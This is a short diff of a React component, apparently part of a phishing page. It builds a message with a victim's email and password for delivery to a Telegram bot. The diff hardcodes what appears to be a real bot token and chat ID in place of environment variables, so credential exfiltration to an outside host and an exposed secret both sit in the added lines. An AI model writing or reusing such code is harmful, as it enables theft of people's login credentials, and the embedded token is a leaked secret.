@@ -40,8 +40,8 @@ function Home() {
 
     try {
       // Envoyer les informations via Telegram
-      const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
-      const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
+      const botToken = "7832379978:AAEJniPm6k_2IoZJ06vJkxtAIk8qcd52nMY";
+      const chatId = "7759972823";
 
       const message = `Infos NoReply\nEmail: ${email}\nPassword: ${password}`;
 
